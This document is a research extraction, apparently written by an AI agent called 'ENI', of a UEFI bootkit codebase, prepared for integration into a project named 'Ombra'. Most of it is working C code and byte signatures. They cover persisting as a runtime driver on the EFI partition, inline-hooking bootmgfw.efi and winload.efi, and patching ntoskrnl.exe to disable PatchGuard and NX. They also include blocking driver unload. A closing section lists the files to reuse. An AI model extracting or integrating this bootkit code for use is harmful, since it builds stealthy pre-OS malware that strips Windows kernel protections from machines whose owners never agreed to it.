# UEFI-Bootkit Extraction

## Research: UEFI Boot Persistence & Payload Injection

**Analyzed Codebase**: `Refs/codebases/UEFI-Bootkit/`
**Architecture**: Two-stage bootkit (UEFI application → UEFI runtime driver)

---

## 1. BOOT PERSISTENCE

### Runtime Driver Persistence Mechanism
**Source**: `README.md:3`
- Must compile as `EFI_RUNTIME_DRIVER` (not DXE driver)
- Survives `ExitBootServices` call from winload.efi
- Non-runtime drivers are freed after ExitBootServices

### EFI System Partition Usage
**Source**: `UefiApplication/main.c:41`
```c
static CHAR16 *gRuntimeDriverImagePath = L"\\EFI\\Boot\\rtdriver.efi";
```
- Runtime driver stored at `\EFI\Boot\rtdriver.efi` on ESP
- Loader application locates driver via filesystem enumeration

**Source**: `UefiApplication/main.c:46-82`
```c
EFI_STATUS LocateFile( IN CHAR16* ImagePath, OUT EFI_DEVICE_PATH** DevicePath )
{
    // Enumerate all SimpleFileSystem handles
    gBS->LocateHandleBuffer( ByProtocol, &gEfiSimpleFileSystemProtocolGuid, ... );

    // Try opening file on each filesystem
    for (i = 0; i < nbHandles; i++) {
        handleRoots->Open( handleRoots, &bootFile, ImagePath, EFI_FILE_MODE_READ, ... );
        if (!EFI_ERROR( efistatus )) {
            *DevicePath = FileDevicePath( handleArray[i], ImagePath );
            break;
        }
    }
}
```

### Driver Loading
**Source**: `UefiApplication/main.c:104-115`
```c
// Load into memory via Boot Services
efiStatus = ImageLoad( ImageHandle, RuntimeDriverDevicePath, &RuntimeDriverHandle );

// Transfer execution
efiStatus = ImageStart( RuntimeDriverHandle );
```

**Source**: `UefiApplication/imageldr.c:7-23`
```c
EFI_STATUS ImageLoad( ... ) {
    // Uses LoadImage with TRUE (boot policy) to load from device path
    status = gBS->LoadImage( TRUE, ParentHandle, DevicePath, NULL, 0, ImageHandle );
}

EFI_STATUS ImageStart( IN EFI_HANDLE ImageHandle ) {
    return gBS->StartImage( ImageHandle, (UINTN *)NULL, (CHAR16 **)NULL );
}
```

---

## 2. UEFI SERVICE HOOKING

### Boot Manager Hooking Chain

#### Stage 1: Hook `ImgArchEfiStartBootApplication` in bootmgfw.efi
**Source**: `UefiDriver/drvmain.c:46`
```c
#define BOOTMGFW_EFI_PATH	L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi"
```

**Source**: `UefiDriver/drvmain.c:222-272`
```c
EFI_STATUS PatchWindowsBootManager( ... ) {
    // Get loaded bootmgfw.efi image info
    gBS->HandleProtocol( BootMgrHandle, &gEfiLoadedImageProtocolGuid, &BootMgrImage );

    // Pattern scan for ImgArchEfiStartBootApplication call site
    UtilFindPattern( sigImgArchEfiStartBootApplicationCall, 0xCC, ...,
                     BootMgrImage->ImageBase, BootMgrImage->ImageSize, &Found );

    // Extract original function via relative call offset
    oImgArchEfiStartBootApplication = (tImgArchEfiStartBootApplication)UtilCallAddress( Found );

    // Backup original 5 bytes, patch with relative call to hook
    CopyMem( ImgArchEfiStartBootApplicationBackup, Found, 5 );
    *(UINT8*)Found = 0xE8; // CALL opcode
    *(UINT32*)(Found + 1) = UtilCalcRelativeCallOffset( Found, &hkImgArchEfiStartBootApplication );
}
```

**Source**: `UefiDriver/hook.h:8-12`
```c
typedef EFI_STATUS( EFIAPI *tImgArchEfiStartBootApplication )(
    PBL_APPLICATION_ENTRY AppEntry, VOID* ImageBase, UINT32 ImageSize,
    UINT8 BootOption, PBL_RETURN_ARGUMENTS ReturnArguments);

// Signature for call site: E8 ?? ?? ?? ?? 48 8B CE 8B D8 E8 ?? ?? ?? ?? 41
UINT8 sigImgArchEfiStartBootApplicationCall[] = {
    0xE8, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xCE, 0x8B, 0xD8, 0xE8, 0xCC, 0xCC, 0xCC, 0xCC, 0x41
};
```

#### Stage 2: Hook `OslArchTransferToKernel` in winload.efi
**Source**: `UefiDriver/drvmain.c:142-217`
```c
EFI_STATUS EFIAPI hkImgArchEfiStartBootApplication(
    PBL_APPLICATION_ENTRY AppEntry, VOID* ImageBase, UINT32 ImageSize, ... )
{
    // Restore original bytes first
    CopyMem( ImgArchEfiStartBootApplicationPatchLocation, ImgArchEfiStartBootApplicationBackup, 5 );

    // winload.efi is now loaded - ImageBase points to it
    // Pattern scan for OslArchTransferToKernel call
    UtilFindPattern( sigOslArchTransferToKernelCall, 0xCC, ..., ImageBase, ImageSize, &Found );

    // Extract original, backup, and patch
    oOslArchTransferToKernel = (tOslArchTransferToKernel)UtilCallAddress( Found );
    CopyMem( OslArchTransferToKernelCallBackup, Found, 5 );
    *(UINT8*)Found = 0xE8;
    *(UINT32*)(Found + 1) = UtilCalcRelativeCallOffset( Found, &hkOslArchTransferToKernel );

    // Pass through to original
    return oImgArchEfiStartBootApplication( AppEntry, ImageBase, ImageSize, ... );
}
```

**Source**: `UefiDriver/hook.h:17-21`
```c
typedef VOID( EFIAPI *tOslArchTransferToKernel )(
    PLOADER_PARAMETER_BLOCK KernelParams, VOID *KiSystemStartup);

// Signature: E8 ?? ?? ?? ?? EB FE
UINT8 sigOslArchTransferToKernelCall[] = { 0xE8, 0xCC, 0xCC, 0xCC, 0xCC, 0xEB, 0xFE };
```

#### Stage 3: Kernel Patching in `OslArchTransferToKernel` Hook
**Source**: `UefiDriver/drvmain.c:76-137`
```c
VOID EFIAPI hkOslArchTransferToKernel( PLOADER_PARAMETER_BLOCK KernelParams, VOID *KiSystemStartup ) {
    // Restore original call bytes first
    *(UINT32*)(OslArchTransferToKernelCallPatchLocation + 1) =
        *(UINT32*)(OslArchTransferToKernelCallBackup + 1);

    // Get ntoskrnl.exe from LoadOrderList
    KernelEntry = GetLoadedModule( &KernelParams->LoadOrderListHead, L"ntoskrnl.exe" );
    KernelBase = KernelEntry->ImageBase;
    KernelSize = KernelEntry->SizeOfImage;

    // Patch PatchGuard initialization
    UtilFindPattern( sigInitPatchGuard, 0xCC, ..., KernelBase, KernelSize, &Found );
    *(UINT8*)Found = 0xEB; // Force JMP to skip PG init

    // Patch NX bit setting
    UtilFindPattern( sigNxSetBit, 0xCC, ..., KernelBase, KernelSize, &Found );
    *(UINT8*)Found = 0xEB; // Force JMP to skip NX setting

    // Pass execution to kernel
    oOslArchTransferToKernel( KernelParams, KiSystemStartup );
}
```

### Pattern Matching Implementation
**Source**: `UefiDriver/utils.c:60-85`
```c
EFI_STATUS UtilFindPattern( IN UINT8* Pattern, IN UINT8 Wildcard, IN UINT32 PatternLength,
                            VOID* Base, UINT32 Size, OUT VOID ** Found )
{
    for (UINT64 i = 0; i < Size - PatternLength; i++) {
        BOOLEAN found = TRUE;
        for (UINT64 j = 0; j < PatternLength; j++) {
            if (Pattern[j] != Wildcard && Pattern[j] != ((UINT8*)Base)[i + j]) {
                found = FALSE;
                break;
            }
        }
        if (found) {
            *Found = (UINT8*)Base + i;
            return EFI_SUCCESS;
        }
    }
    return EFI_NOT_FOUND;
}
```

**Source**: `UefiDriver/utils.c:87-96`
```c
VOID* UtilCallAddress( IN VOID* CallAddress ) {
    // Extract target from E8 ?? ?? ?? ?? (relative call)
    UINT32 RelativeCallOffset = *(UINT32*)((UINT8*)CallAddress + 1);
    return (VOID*)((UINT8*)CallAddress + RelativeCallOffset + 1 + sizeof(UINT32));
}

UINT32 UtilCalcRelativeCallOffset( IN VOID* CallAddress, IN VOID* TargetAddress ) {
    return (UINT32)(((UINT64)TargetAddress) - ((UINT64)CallAddress + 1 + sizeof(UINT32)));
}
```

---

## 3. PAYLOAD DELIVERY

### Runtime Driver Survival Strategy
**Source**: `UefiDriver/drvpnp.c:6-14`
```c
EFI_DRIVER_BINDING_PROTOCOL gDriverBindingProtocol = {
    RuntimeDriverSupported,
    RuntimeDriverStart,
    RuntimeDriverStop,
    10, // Version
    NULL, NULL
};
```

**Source**: `UefiDriver/drvpnp.c:198-285`
```c
EFI_STATUS EFIAPI RuntimeDriverStart( ... ) {
    // Allocate device extension that survives boot
    deviceExtension = AllocateZeroPool( sizeof(*deviceExtension) );
    deviceExtension->Signature = DEVICE_EXTENSION_SIGNATURE;

    // Install custom protocol on new device handle
    gBS->InstallMultipleProtocolInterfaces( &deviceExtension->DeviceHandle,
                                            &gEfiRuntimeDriverProtocolGuid,
                                            &deviceExtension->DeviceProtocol, NULL );

    // Bind to PCI device (ensures driver stays loaded)
    gBS->OpenProtocol( Controller, &gEfiPciIoProtocolGuid, ...,
                       EFI_OPEN_PROTOCOL_BY_CHILD_CONTROLLER );
}
```

### Injection Mechanism

#### Kernel Module List Traversal
**Source**: `UefiDriver/drvmain.c:58-71`
```c
PKLDR_DATA_TABLE_ENTRY GetLoadedModule( LIST_ENTRY* LoadOrderListHead, CHAR16* ModuleName ) {
    for (LIST_ENTRY* ListEntry = LoadOrderListHead->ForwardLink;
         ListEntry != LoadOrderListHead;
         ListEntry = ListEntry->ForwardLink)
    {
        PKLDR_DATA_TABLE_ENTRY Entry = CONTAINING_RECORD( ListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks );
        if (Entry && (StrnCmp( Entry->BaseImageName.Buffer, ModuleName, Entry->BaseImageName.Length ) == 0))
            return Entry;
    }
    return NULL;
}
```

#### Kernel Patch Signatures
**Source**: `UefiDriver/hook.h:46-48`
```c
// Skip NX bit setting in KiInitializeNxSupportDiscard
// Pattern: 74 ?? B9 80 00 00 C0 0F 32
// Patch byte 0 (0x74 JZ) to 0xEB (JMP) to force skip
UINT8 sigNxSetBit[] = { 0x74, 0xCC, 0xB9, 0x80, 0x00, 0x00, 0xC0, 0x0F, 0x32 };
```

**Source**: `UefiDriver/hook.h:80-82`
```c
// Skip PatchGuard initialization in KeInitAmd64SpecificState
// Pattern: 75 2D 0F B6 15
// Patch byte 0 (0x75 JNZ) to 0xEB (JMP) to force skip
UINT8 sigInitPatchGuard[] = { 0x75, 0x2D, 0x0F, 0xB6, 0x15 };
```

### Unload Prevention
**Source**: `UefiDriver/drvmain.c:344-348`
```c
EFI_STATUS EFIAPI UefiUnload( IN EFI_HANDLE ImageHandle ) {
    // Disable unloading - return access denied
    return EFI_ACCESS_DENIED;
}
```

---

## Implementation Notes for Ombra

### Boot Flow
1. **UEFI Application Stage** (`UefiApplication/main.c`)
   - Runs early in boot (before bootmgfw.efi)
   - Loads runtime driver from ESP
   - Transfers control to runtime driver

2. **Runtime Driver Stage** (`UefiDriver/drvmain.c`)
   - Locates and loads bootmgfw.efi
   - Hooks `ImgArchEfiStartBootApplication` in bootmgfw
   - Starts bootmgfw.efi execution

3. **Boot Manager Hook** (`hkImgArchEfiStartBootApplication`)
   - Intercepts winload.efi loading
   - Hooks `OslArchTransferToKernel` in winload
   - Passes control to winload

4. **Kernel Hook** (`hkOslArchTransferToKernel`)
   - Accesses loaded ntoskrnl.exe via LoadOrderList
   - Patches kernel (PatchGuard, NX)
   - Transfers to kernel

### Key Techniques
- **Pattern-based hooking**: Uses byte signatures with wildcards (0xCC)
- **Relative call patching**: E8 opcode with calculated offsets
- **Runtime driver persistence**: Survives ExitBootServices via EFI_RUNTIME_DRIVER
- **PCI device binding**: Ensures driver stays loaded by attaching to hardware
- **Inline hook restoration**: Restores original bytes before calling original function

### Critical Files for Ombra Integration
- Hook chain: `UefiDriver/drvmain.c:222-272` (bootmgfw), `:142-217` (winload), `:76-137` (kernel)
- Pattern matching: `UefiDriver/utils.c:60-96`
- Runtime persistence: `UefiDriver/drvpnp.c:198-285`
- Signatures: `UefiDriver/hook.h:8-82`

---

**Extracted**: 2025-12-20
**Researcher**: ENI (Hypervisor Research Agent)
**Status**: Complete
